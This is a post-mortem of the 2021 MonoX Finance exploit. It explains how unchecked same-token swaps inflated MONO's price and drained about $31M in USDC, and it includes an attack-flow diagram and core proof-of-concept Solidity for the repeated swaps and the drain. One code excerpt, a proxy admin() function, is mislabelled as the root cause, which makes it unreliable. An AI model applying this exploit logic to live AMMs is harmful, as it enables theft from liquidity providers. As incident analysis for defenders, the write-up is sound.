# MonoX Finance — Self-Token Swap Price Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2021-11-30 |
| **Protocol** | MonoX Finance |
| **Chain** | Ethereum |
| **Loss** | ~$31M |
| **Attacker** | N/A |
| **Attack Tx** | Block 13715025 |
| **Vulnerable Contract** | [Monoswap 0xC36a7887](https://etherscan.io/address/0xC36a7887786389405EA8DA0B87602Ae3902B88A1) |
| **Root Cause** | Swapping MONO token with itself (MONO→MONO) causes price to increase indefinitely |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2021-11/Mono_exp.sol) |

---
## 1. Vulnerability Overview

MonoX is an AMM that supports single-token liquidity provision, where each token is paired with vCASH (a virtual stablecoin) in a single pool. The `swapExactTokenForToken()` function did not prevent cases where tokenIn and tokenOut are identical. The attacker purchased a small amount of MONO, then repeated the MONO→MONO swap 55 times to inflate the vCASH-denominated price of MONO to an extreme degree. The inflated MONO was then exchanged for USDC, draining the pool's USDC reserves.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable: allows tokenIn == tokenOut swaps
function swapExactTokenForToken(
    address tokenIn,
    address tokenOut,
    uint256 amountIn,
    uint256 amountOutMin,
    address to,
    uint256 deadline
) external {
    // ❌ No check for tokenIn == tokenOut
    // require(tokenIn != tokenOut, "same token");

    // When MONO→MONO swap occurs:
    // - tokenIn price: decreases after swap
    // - tokenOut price: increases after swap
    // - Since it's the same token, price only keeps rising
}

// Internal price update:
// priceIn decreases (tokenIn left the pool)
// priceOut increases (tokenOut entered the pool)
// If tokenIn == tokenOut, both effects combine → net price increase

// ✅ Fix:
// require(tokenIn != tokenOut, "MonoX: SAME_TOKEN");
```

### On-Chain Original Code

Source: Sourcify verified


**TransparentUpgradeableProxy.sol** — entry point:
```solidity
// ❌ Root cause: swapping MONO token with itself (MONO→MONO) causes price to increase indefinitely
    function admin() external ifAdmin returns (address admin_) {
        admin_ = _getAdmin();
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─1─► Remove liquidity from 3 users (abusing removeLiquidity)
  │       └─► Pool liquidity decreases → easier to manipulate price
  │
  ├─2─► Buy small amount of MONO with 0.1 WETH (monoswap.swapExactTokenForToken)
  │
  ├─3─► Call monoswap.addLiquidity(MONO, amount)
  │       └─► Add MONO liquidity
  │
  ├─4─► Repeat MONO→MONO swap 55 times:
  │       for (i < 55):
  │           swapExactTokenForToken(MONO, MONO, poolMONOBalance - 1, ...)
  │           └─► MONO price increases each iteration
  │               (tokenIn decrease + tokenOut increase = net price increase)
  │
  ├─5─► Swap MONO → USDC:
  │       swapTokenForExactToken(MONO, USDC, monoBalance, 4T USDC, ...)
  │       └─► Drain USDC using the extremely inflated MONO price
  │
  └─6─► ~$31M USDC drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function Swap_Mono_for_Mono_55_Times() internal {
    for (uint256 i = 0; i < 55; i++) {
        // Query current MONO balance in the pool
        (,,,,,, Amount_Of_MonoToken_On_XPool,,) = monoswap.pools(Mono_Token_Address);

        // ❌ MONO → MONO swap (tokenIn == tokenOut)
        // MONO price increases with each iteration
        monoswap.swapExactTokenForToken(
            Mono_Token_Address,
            Mono_Token_Address,  // tokenOut = tokenIn (the vulnerability!)
            Amount_Of_MonoToken_On_XPool - 1,
            0,
            address(this),
            block.timestamp
        );
    }
}

function Swap_Mono_For_USDC() internal {
    // After 55 swaps, MONO price is extremely inflated
    // Drain entire USDC pool using held MONO
    (,,,,,, Amount_Of_USDC_On_XPool,,) = monoswap.pools(USDC_Address);
    Amoount_Of_Mono_On_This = mono.balanceOf(address(this));

    monoswap.swapTokenForExactToken(
        Mono_Token_Address,
        USDC_Address,
        Amoount_Of_Mono_On_This,
        4_000_000_000_000, // 4 trillion USDC (effectively the entire pool)
        msg.sender,
        block.timestamp
    );
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **CWE** | CWE-20: Improper Input Validation |
| **Vulnerability Type** | Same-token swap allowed / Price manipulation |
| **Attack Vector** | Indefinite price inflation via repeated MONO→MONO swaps |
| **Impact** | $31M loss |
| **DASP** | Business Logic |

## 6. Remediation Recommendations

1. **Block same-token swaps**: `require(tokenIn != tokenOut, "same token")`
2. **Price movement cap**: Limit the maximum price change ratio per single swap
3. **Cumulative price change detection**: Monitor cumulative price deviation caused by consecutive swaps
4. **Single-block swap limit**: Restrict the number of swaps per block for the same token pool

## 7. Lessons Learned

- In an AMM, there is no legitimate use case where tokenIn == tokenOut. Such obvious error conditions must always be blocked through input validation.
- MonoX's single-token liquidity model is particularly vulnerable to price manipulation. Because each token has an independent pool, prices can be freely manipulated without external liquidity constraints.
- A single `require` statement could have prevented $31M in losses.